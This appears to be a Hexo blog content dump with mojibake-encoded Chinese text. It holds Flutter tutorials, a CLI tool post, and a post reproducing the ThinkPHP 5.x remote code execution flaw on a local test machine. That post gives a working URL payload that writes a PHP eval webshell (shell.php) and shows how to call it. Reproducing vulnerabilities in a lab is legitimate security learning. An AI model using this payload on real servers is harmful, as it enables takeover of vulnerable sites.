class="comment">// è¯¥ç»„ä»¶åº“ è¿˜æä¾›äº† builder å›æ‰äº‹ä»¶ï¼Œåªè¦çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œè¿™é‡Œå°±ä¼šè‡ªåŠ¨é‡æ–°build</span></span><br><span class="line">        child: BlocBuilder(</span><br><span class="line">          bloc: themeBloc,</span><br><span class="line">          builder: (BuildContext context, <span class="built_in">bool</span> state) &#123;</span><br><span class="line">            <span class="keyword">return</span> MaterialApp(</span><br><span class="line">              title: <span class="string">&#x27;é¹°çœ¼è§†é¢‘&#x27;</span>,</span><br><span class="line">              <span class="comment">// åœ¨è¿™é‡Œ å»ä½¿ç”¨çŠ¶æ€å€¼ï¼Œ åˆ¤æ–­æ˜¯å¦ä¸ºtrue å®ç° ä¸»é¢˜çš„é‡æ–°ç»‘å®šã€‚</span></span><br><span class="line">              theme: state ? MyTheme.lightTheme : MyTheme.darkTheme,</span><br><span class="line">              home: <span class="keyword">new</span> HomePage(),</span><br><span class="line">              routes: &lt;<span class="built_in">String</span>, WidgetBuilder&gt;&#123;</span><br><span class="line">                <span class="string">&#x27;/aboutPage&#x27;</span>: (BuildContext context) =&gt; <span class="keyword">new</span> AboutPage()</span><br><span class="line">              &#125;</span><br><span class="line">            );</span><br><span class="line">          &#125;,</span><br><span class="line">        ));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äº‹ä»¶ToçŠ¶æ€"><a href="#äº‹ä»¶ToçŠ¶æ€" class="headerlink" title="äº‹ä»¶ToçŠ¶æ€"></a>äº‹ä»¶ToçŠ¶æ€</h3><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬èƒ½æ„Ÿå—åˆ° Bloc çš„ç¾ï¼Œå®ƒæŠŠeventè½¬æ¢æˆäº†state.</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@override</span></span><br><span class="line">Widget build(BuildContext context) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  å–åˆ°ä¸Šå±‚æ³¨å…¥çš„bloc,å¯ä½¿ç”¨ BlocProvider.of&lt;ThemeBloc&gt;(context);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> ThemeBloc themeBloc = BlocProvider.of&lt;ThemeBloc&gt;(context);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> IconButton(</span><br><span class="line">        icon: <span class="keyword">new</span> Icon(Icons.remove_red_eye),</span><br><span class="line">        onPressed: () &#123;</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œå»è§¦å‘æˆ‘ä»¬ä¹‹å‰å®šä¹‰çš„äº‹ä»¶ï¼Œå®ç°çŠ¶æ€çš„æ”¹å˜</span></span><br><span class="line">            themeBloc.changeTheme();</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>stream å¯ä»¥çœ‹ä½œä¸€ä¸ª æ±¡æ°´è¿‡æ»¤å™¨ï¼Œ æŠŠæ±¡æ°´ä»ä¸€ç«¯æ³¨å…¥ï¼Œä»å¦ä¸€ç«¯æµå‡ºæ¸…æ°´ã€‚ æ±¡æ°´è½¬æˆæ¸…æ°´ å°±æ˜¯onTransitionçš„åŠŸåŠ³äº†ï¼Œä»–è´Ÿè´£äº†äº‹ä»¶çš„æ‰§è¡Œï¼ŒçŠ¶æ€çš„ä¿®æ”¹ï¼</p><p>å…¶ä»–é¡µé¢çš„ä¸»é¢˜è‰²å¯ä»¥é€šè¿‡**Theme.of(context)**å»ç»§æ‰¿ã€‚</p><h2 id="åŠ¨æ€è®¾ç½®è§†é¢‘æ¯”ä¾‹"><a href="#åŠ¨æ€è®¾ç½®è§†é¢‘æ¯”ä¾‹" class="headerlink" title="åŠ¨æ€è®¾ç½®è§†é¢‘æ¯”ä¾‹"></a>åŠ¨æ€è®¾ç½®è§†é¢‘æ¯”ä¾‹</h2><p>åœ¨å‰2ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»‹ç»äº†<strong>video_player</strong>è§†é¢‘æ’­æ”¾çš„ç»„ä»¶åº“ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_videoPlayController = VideoPlayerController.network(_videoInfo.src )</span><br><span class="line">    ..addListener(() &#123;</span><br><span class="line">        <span class="comment">// .. æ˜¯Dartçš„è¯­æ³•ç³–ã€‚ é“¾å¼è°ƒç”¨çš„ å†™æ³•</span></span><br><span class="line">        <span class="comment">//  æ ¹æ®è§†é¢‘è®¾ç½® å°ºå¯¸æ¯”ä¾‹</span></span><br><span class="line">        <span class="keyword">final</span> <span class="built_in">double</span> aRatio = _videoPlayController.value.aspectRatio;</span><br><span class="line">        <span class="keyword">if</span> (_aRatio != aRatio) &#123;</span><br><span class="line">        setState(() &#123;</span><br><span class="line">            _aRatio = aRatio;</span><br><span class="line">        &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>æƒ³åŠ¨æ€æ”¹å˜è§†é¢‘çš„æ¯”åˆ—ï¼Œå°±éœ€è¦çŸ¥é“æ¯ä¸€ä¸ªè§†é¢‘çš„å¤§å°ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å»æ·»åŠ ç›‘å¬å›æ‰æ–¹æ³•å³å¯ã€‚<br>é€šè¿‡<strong>addListener</strong>å»å®ç°ç›‘å¬ã€‚åœ¨<strong>_videoPlayController</strong>æ§åˆ¶å™¨ä¸­ï¼Œæ˜¯å­˜åœ¨è§†é¢‘ä¿¡æ¯çš„ã€‚å¯ä»¥è·å–åˆ°sizeåŠaspectRatio.</p>]]></content>
      
      
      
        <tags>
            
            <tag> flutter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¹°çœ¼è§†é¢‘ (äºŒ)</title>
      <link href="posts/47bb6d5/"/>
      <url>posts/47bb6d5/</url>
      
        <content type="html"><![CDATA[<h2 id="Flutter-é¹°çœ¼è§†é¢‘"><a href="#Flutter-é¹°çœ¼è§†é¢‘" class="headerlink" title="Flutter - é¹°çœ¼è§†é¢‘"></a>Flutter - é¹°çœ¼è§†é¢‘</h2><p>é¹°çœ¼è§†é¢‘ App ç›¸å…³æŠ€æœ¯çŸ¥è¯†ç‚¹,ä¸»è¦ä»‹ç»å¦‚ä¸‹å‡ ç‚¹æŠ€å·§!</p><img src="/posts/47bb6d5/home.png" class="" title="é¹°çœ¼è§†é¢‘"><ul><li>TabBar</li><li>TabBarView</li><li>DefaultTabController</li><li>tab åˆ‡æ¢æ—¶é˜»æ­¢ widget é‡ç»˜</li></ul><a id="more"></a><h3 id="TabBar"><a href="#TabBar" class="headerlink" title="TabBar"></a>TabBar</h3><p>Tab é¡µçš„ Title æ§ä»¶ï¼Œåˆ‡æ¢ Tab é¡µçš„å…¥å£ï¼Œä¸€èˆ¬æ”¾åˆ° AppBar æ§ä»¶ä¸‹ä½¿ç”¨ï¼Œå†…éƒ¨æœ‰*Title å±æ€§ã€‚å…¶å­å…ƒç´ æŒ‰æ°´å¹³æ¨ªå‘æ’åˆ—å¸ƒå±€ï¼Œå¦‚æœéœ€è¦çºµå‘æ’åˆ—ï¼Œè¯·ä½¿ç”¨ Column æˆ– ListView æ§ä»¶åŒ…è£…ä¸€ä¸‹ã€‚å­å…ƒç´ ä¸º Tab ç±»å‹çš„æ•°ç»„ã€‚</p><h3 id="TabBarView"><a href="#TabBarView" class="headerlink" title="TabBarView"></a>TabBarView</h3><p>Tab é¡µçš„å†…å®¹å®¹å™¨ï¼Œå…¶å†…æ”¾ç½® Tab é¡µçš„ä¸»ä½“å†…å®¹ã€‚å­å…ƒç´ å¯ä»¥æ˜¯å¤šä¸ªå„ç§ç±»å‹çš„æ§ä»¶ã€‚</p><h3 id="DefaultTabController"><a href="#DefaultTabController" class="headerlink" title="DefaultTabController"></a>DefaultTabController</h3><p>DefaultTabControllerï¼Œæ˜¯ä¸€ä¸ªé»˜è®¤çš„ tabView æ§åˆ¶å™¨ã€‚ä¸éœ€è¦è‡ªå·±å»ç»´æŠ¤ controller,ç”±ç»„ä»¶å»ç»´æŠ¤ã€‚</p><h3 id="tab-åˆ‡æ¢æ—¶é˜»æ­¢-widget-é‡ç»˜"><a href="#tab-åˆ‡æ¢æ—¶é˜»æ­¢-widget-é‡ç»˜" class="headerlink" title="tab åˆ‡æ¢æ—¶é˜»æ­¢ widget é‡ç»˜"></a>tab åˆ‡æ¢æ—¶é˜»æ­¢ widget é‡ç»˜</h3><p>å› ä¸º Flutter ä¸ºäº†èŠ‚çº¦å†…å­˜ä¸ä¼šä¿å­˜ widget çš„çŠ¶æ€ï¼Œwidget éƒ½æ˜¯ä¸´æ—¶å˜é‡ã€‚å½“æˆ‘ä»¬ä½¿ç”¨ TabBarï¼ŒTabBarView æ˜¯æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œåˆ‡æ¢ tab åå†é‡æ–°åˆ‡æ¢å›ä¸Šä¸€é¡µé¢ï¼Œè¿™æ—¶å€™ tab ä¼šé‡æ–°åŠ è½½é‡æ–°åˆ›å»ºï¼Œä½“éªŒå¾ˆä¸å‹å¥½ã€‚ä¸è¿‡ Flutter è¿˜æ˜¯ä¸ºæˆ‘ä»¬æä¾›äº†è§£å†³åŠæ³•ã€‚æˆ‘ä»¬å¯ä»¥å¼ºåˆ¶ widget ä¸æ˜¾ç¤ºæƒ…å†µä¸‹ä¿ç•™çŠ¶æ€ï¼Œä¸‹å›å†åŠ è½½æ—¶å°±ä¸ç”¨é‡æ–°åˆ›å»ºäº†ã€‚</p><p>AutomaticKeepAliveClientMixin æ˜¯ä¸€ä¸ªæŠ½è±¡çŠ¶æ€ï¼Œä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨æˆ‘ä»¬è‡ªå·±çš„çŠ¶æ€ç»§æ‰¿è¿™ä¸ªæŠ½è±¡çŠ¶æ€ï¼Œå¹¶å®ç° wantKeepAlive æ–¹æ³•å³å¯ã€‚</p><p>ç»§æ‰¿è¿™ä¸ªçŠ¶æ€åï¼Œwidget åœ¨ä¸æ˜¾ç¤ºä¹‹åä¹Ÿä¸ä¼šè¢«é”€æ¯ä»ç„¶ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥æ…é‡ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_VideoList</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">VideoList</span>&gt; <span class="title">with</span> <span class="title">AutomaticKeepAliveClientMixin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å½“é¡µé¢ä¸æ˜¾ç¤ºçš„æ—¶å€™ä¹Ÿå¸¸é©»åœ¨å†…å­˜ä¸­</span></span><br><span class="line">  <span class="meta">@protected</span></span><br><span class="line">  <span class="built_in">bool</span> <span class="keyword">get</span> wantKeepAlive=&gt;<span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Demo-æºç "><a href="#Demo-æºç " class="headerlink" title="Demo æºç "></a>Demo æºç </h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/view/VideoList.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  _HomePageState createState() =&gt; _HomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_HomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">HomePage</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰éœ€è¦å±•ç¤ºçš„ é€‰é¡¹å¡</span></span><br><span class="line"><span class="keyword">final</span> <span class="built_in">List</span>&lt;Tab&gt; myTabs = &lt;Tab&gt;[</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;æ¨è&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;æç¬‘&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;å¥åº·&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;ç¾å¥³&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;å†å²&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;æ±½è½¦&#x27;</span>)</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> DefaultTabController(</span><br><span class="line">        length: myTabs.length,</span><br><span class="line">        child: <span class="keyword">new</span> Scaffold(</span><br><span class="line">            appBar: AppBar(</span><br><span class="line">                bottom: <span class="keyword">new</span> TabBar(</span><br><span class="line">                  tabs: myTabs,</span><br><span class="line">                  isScrollable: <span class="keyword">true</span>,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br><span class="line">            body: <span class="keyword">new</span> TabBarView(</span><br><span class="line">                children: myTabs.map((Tab tab) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Center(</span><br><span class="line">                        <span class="comment">// æ­¤å¤„æˆ‘æŠŠVideoListè¿›è¡Œäº†å°è£…ï¼Œå¯¼å…¥ä½¿ç”¨å°±å¯ä»¥ã€‚</span></span><br><span class="line">                        child: <span class="keyword">new</span> VideoList(tab.text)</span><br><span class="line">                    );</span><br><span class="line">                &#125;).toList(),</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>Dart è¯­è¨€è¿˜æ˜¯æœ‰ç€ç‹¬ç‰¹çš„é­…åŠ›ï¼Œæ€»æ˜¯è¯±å¯¼æˆ‘èµ°å‘é”™è¯¯çš„è¾¹ç¼˜ã€‚Dart æ˜¯ä¸€ä¸ªå¼ºç±»å‹çš„è¯­è¨€å¯ä¸èƒ½æŒ‰ç…§ js çš„æ ‡å‡†å»ä½¿ç”¨ï¼Œè¦æŒ‰ç…§ TypeScript æ ‡å‡†å»é€‚åº”ã€‚<br>åˆ°äº† Flutter ä¸­ï¼Œå°±éœ€è¦å¤§é‡çš„ä½¿ç”¨æ³›å‹ã€Mapã€List Json ä¸ ModelClass çš„è½¬æ¢ï¼Œå·®ä¸å¤šéƒ½æ˜¯ java çš„é‚£ä¸€å¥—æ–¹æ³•è®ºï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> flutter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp-5.0 GetShell</title>
      <link href="posts/5fbecc6/"/>
      <url>posts/5fbecc6/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æš´éœ²å‡ºäº†ThinkPhpæ¡†æ¶ç¼ºé™·å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¥ˆä½•å¤©ç½‘æ¢æ¢ï½ï½ï¼Œå°èœä¹Ÿåªèƒ½åœ¨æœ¬åœ°çˆ½ä¸€æŠŠï¼</p><h3 id="é¶æœºç¯å¢ƒ"><a href="#é¶æœºç¯å¢ƒ" class="headerlink" title="é¶æœºç¯å¢ƒ"></a>é¶æœºç¯å¢ƒ</h3><p>php5.6 + nginx + PHPStrom + xDebug</p><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><ul><li>Thinkphp 5.1.0 - 5.1.31</li><li>Thinkphp 5.0.5 - 5.0.23</li></ul><h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3><p>Thinkphp5.xç‰ˆæœ¬(5.0.20)ä¸­æ²¡æœ‰å¯¹è·¯ç”±ä¸­çš„æ§åˆ¶å™¨è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œæ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æ¡ä»¶ä¸‹ <strong>(é»˜è®¤ä¸å¼€å¯)</strong> ï¼Œå¯¼è‡´å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç åˆ©ç”¨åå°„ç±»è°ƒç”¨å‘½åç©ºé—´å…¶ä»–ä»»æ„å†…ç½®ç±»ï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><a id="more"></a><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>Thinkphp <strong>pathinfo</strong> æ–¹æ³•ä¸­ æœ‰è¿™ä¹ˆä¸€æ¡ä»£ç <strong>Config::get(â€˜var_pathinfoâ€™)</strong> ï¼Œæ˜¯é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®çš„å‚æ•°ï¼Œè€Œ**â€™var_pathinfoâ€™** çš„é»˜è®¤é…ç½®ä¸ºsï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ $_GET[â€˜sâ€™] æ¥ä¼ é€’è·¯ç”±ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨pathinfoæ¥ä¼ é€’ç»“åˆå‰é¢åˆ†æå¯å¾—åˆæ­¥åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼šindex.php?s=index/\namespace\class/methodï¼Œ</p><h4 id="ä»£ç åˆ©ç”¨"><a href="#ä»£ç åˆ©ç”¨" class="headerlink" title="ä»£ç åˆ©ç”¨"></a>ä»£ç åˆ©ç”¨</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=/index/\think\app/invokefunction</span><br><span class="line">&amp;function=call_user_func_array</span><br><span class="line">&amp;vars[0]=file_put_contents</span><br><span class="line">&amp;vars[1][]=shell.php</span><br><span class="line">&amp;vars[1][]=<span class="tag">&lt;<span class="name">?php</span> @<span class="attr">eval</span>($<span class="attr">_GET</span>[&quot;<span class="attr">code</span>&quot;])?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><blockquote><p><a href="http://127.0.0.1/shell.php">http://127.0.0.1/shell.php</a></p></blockquote><h3 id="ç‹¬ç™½"><a href="#ç‹¬ç™½" class="headerlink" title="ç‹¬ç™½"></a>ç‹¬ç™½</h3><p>è¿˜è®°å¾—åˆšæ­¥å…¥å®‰å…¨é¢†åŸŸæ—¶ï¼Œä¸€ç›´æä¸æ‡‚ä»€ä¹ˆæ˜¯ä¸€å¥è¯æœ¨é©¬<br>æ¯æ¬¡éªŒè¯æ˜¯å¦æ¤å…¥ä¸€å¥è¯æœ¨é©¬æˆåŠŸï¼Œéƒ½è¦æ‰¾<strong>ä¸­å›½èœåˆ€</strong>å»éªŒè¯</p><p>ç›´åˆ°æœ‰ä¸€å¤©ï¼Œé¡¿æ‚Ÿäº†ï¼<br>éªŒè¯æ˜¯å¦æˆåŠŸï¼Œå¯ä»¥è¿™æ ·ï¼ -&gt; <a href="http://127.0.0.1/shell.php?code=phpinfo()">http://127.0.0.1/shell.php?code=phpinfo()</a><br>åŸæ¥æ‰€è°“çš„å¯†ç å°±æ˜¯å‚æ•°åï¼<br>çŸ¥é“ä¸€å¥è¯æœ¨é©¬åŸç†çš„ä½ ï¼Œæ˜¯ä¸æ˜¯å„ç§ç½‘ç«™å¼€å‘è¯­è¨€çš„ğŸï¼Œéƒ½æœ‰äº†ï¼</p><p>é‚£æ˜¯ä¸æ˜¯ï¼Œæ‰€æœ‰çš„ç½‘ç«™éƒ½å¯ä»¥è¿™æ ·æ¥æå‘¢ï¼Œå‘ç°ä¸è¡Œå•Šï¼<br>åŸæ¥æ˜¯@evalèµ·çš„æ‰§è¡Œä½œç”¨ã€‚è¿™å°±å‡ºç°äº†æ–°çš„æ¼æ´å‘½ä»¤å¯æ‰§è¡Œæ¼æ´â€“ï¼</p><p>ç„¶åå®‰å…¨æ€æ¯’ç±»è½¯ä»¶è¯ç”Ÿäº†ï¼Œå„ç§æœ¨é©¬æ‹¦æˆªï¼Œé“å‹ä»¬å¼€å§‹äº†ä¸€å¥è¯æœ¨é©¬çš„å˜å¼‚ã€‚<br>å¯è°“æ˜¯é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼</p><p>ç–è€Œä¸æ¼å•Šï¼Œè¿˜æ˜¯è½¬è¡Œçš„ <strong>å®‰å…¨</strong> ï¼ï¼ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> thinkphp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>okcoin-cli è¾…åŠ©</title>
      <link href="posts/5da3d5f3/"/>
      <url>posts/5da3d5f3/</url>
      
        <content type="html"><![CDATA[<h3 id="okIcon"><a href="#okIcon" class="headerlink" title="okIcon"></a><a href="https://github.com/1160007652/okIcon">okIcon</a></h3><p><a href="https://github.com/1160007652/okIcon">okIcon</a>æ˜¯ä¸€ä¸ªè‡ªåŠ¨è·å–é˜¿é‡Œiconfontçš„ä¸€ä¸ªåŠ©æ‰‹ï¼Œåªéœ€è¦ç¬¬ä¸€æ¬¡ä½¿ç”¨å®‰è£…æ˜¯åˆå§‹åŒ–ï¼Œåç»­ä¸€ä¸ªå‘½ä»¤è‡ªåŠ¨ä¸‹è½½é‡Šæ”¾ã€‚</p><h4 id="ä½¿ç”¨çš„æ¨¡å—"><a href="#ä½¿ç”¨çš„æ¨¡å—" class="headerlink" title="ä½¿ç”¨çš„æ¨¡å—"></a>ä½¿ç”¨çš„æ¨¡å—</h4><p>fs nodeè‡ªå¸¦ æ–‡ä»¶åº“<br><a href="https://www.npmjs.com/package/fs-extra">fs-extra</a> ç¬¬ä¸‰æ–¹æ–‡ä»¶åº“<br><a href="https://www.npmjs.com/package/commander">commander</a> å‘½ä»¤è¡ŒæŒ‡ä»¤è§£å†³æ–¹æ¡ˆæ¨¡å—<br><a href="https://www.npmjs.com/package/inquirer">inquirer</a> å‘½ä»¤è¡Œäº¤äº’æ¨¡å—<br><a href="https://www.npmjs.com/package/request">request</a> ç½‘ç»œè®¿é—®åº“<br><a href="https://www.npmjs.com/package/log-symbols">log-symbols</a> å‘½ä»¤è¡Œè¾“å‡ºå›¾æ ‡<br><a href="https://www.npmjs.com/package/chalk">chalk</a> å‘½ä»¤è¡Œæ–‡å­—é¢œè‰²<br><a href="https://www.npmjs.com/package/cross-spawn">cross-spawn</a> è·¨å¹³å°shellæ‰§è¡Œ<br><a href="https://www.npmjs.com/package/walk">walk</a> ç›®å½•ã€æ–‡ä»¶éå†åº“</p><a id="more"></a><h3 id="åˆ¶ä½œokcoin"><a href="#åˆ¶ä½œokcoin" class="headerlink" title="åˆ¶ä½œokcoin"></a>åˆ¶ä½œokcoin</h3><h4 id="æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°"><a href="#æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°"></a>æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°</h4><p>å¦‚ï¼š npm init -y ,è¿™é‡Œ init -y å°±æ˜¯æ‰§è¡Œå‘½ä»¤æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œæ¯ä¸ªå‚æ•°éƒ½æ˜¯ç©ºæ ¼éš”å¼€çš„ã€‚<br>å¦‚ä¸‹ä»£ç ï¼Œæˆ‘å®šä¹‰äº†4ä¸ªæŒ‡ä»¤ï¼Œ åˆ†åˆ«æ˜¯ -v -i -d â€“help , å¯¹åº”çš„æŒ‡ä»¤å¯¹åº”ç›¸åº”çš„å‡½æ•°å»æ‰§è¡Œä¸åŒçš„åŠŸèƒ½ã€‚-væ˜¯æŸ¥çœ‹ç‰ˆæœ¬ã€-iåˆå§‹åŒ–ã€-dä¸‹è½½æ˜¯å¦æ–‡ä»¶ã€- -help æŸ¥çœ‹å¸®åŠ©ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">program.version(<span class="string">&#x27;1.0.0&#x27;</span>, <span class="string">&#x27;-v, --version&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-i, --init&#x27;</span>, <span class="string">&#x27;åˆå§‹åŒ–é…ç½®æ–‡ä»¶&#x27;</span>)</span><br><span class="line">    .option(<span class="string">&#x27;-d, --download&#x27;</span>, <span class="string">&#x27;ä¸‹è½½iconfontæ–‡ä»¶&#x27;</span>)</span><br><span class="line">    .description(<span class="string">&#x27;è‡ªåŠ¨ä¸‹è½½IconFontåŠ©æ‰‹&#x27;</span>);</span><br><span class="line"></span><br><span class="line">program.on(<span class="string">&#x27;--help&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;\n-------------------------------------\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;å…ˆä½¿ç”¨ okIcon -i è¿›è¡Œåˆå§‹åŒ–\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;åç»­iconfontçš„æ”¹åŠ¨ï¼Œä½¿ç”¨ okIcon -d è¿›è¡Œä¸‹è½½\n&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">program.parse(process.argv);</span><br></pre></td></tr></table></figure><h4 id="äº¤äº’å¼æ“ä½œ"><a href="#äº¤äº’å¼æ“ä½œ" class="headerlink" title="äº¤äº’å¼æ“ä½œ"></a>äº¤äº’å¼æ“ä½œ</h4><p>å¦‚æœæ‰§è¡Œäº†æŒ‡ä»¤ <strong>-i</strong> ,é‚£ä¹ˆå°±ä¼šè§¦å‘inquireræ–¹æ³•ã€‚æç¤ºç”¨æˆ·è¾“å…¥å¯¹åº”çš„ä¿¡æ¯ã€‚åšåˆå§‹åŒ–é…ç½®ä½œç”¨ï¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 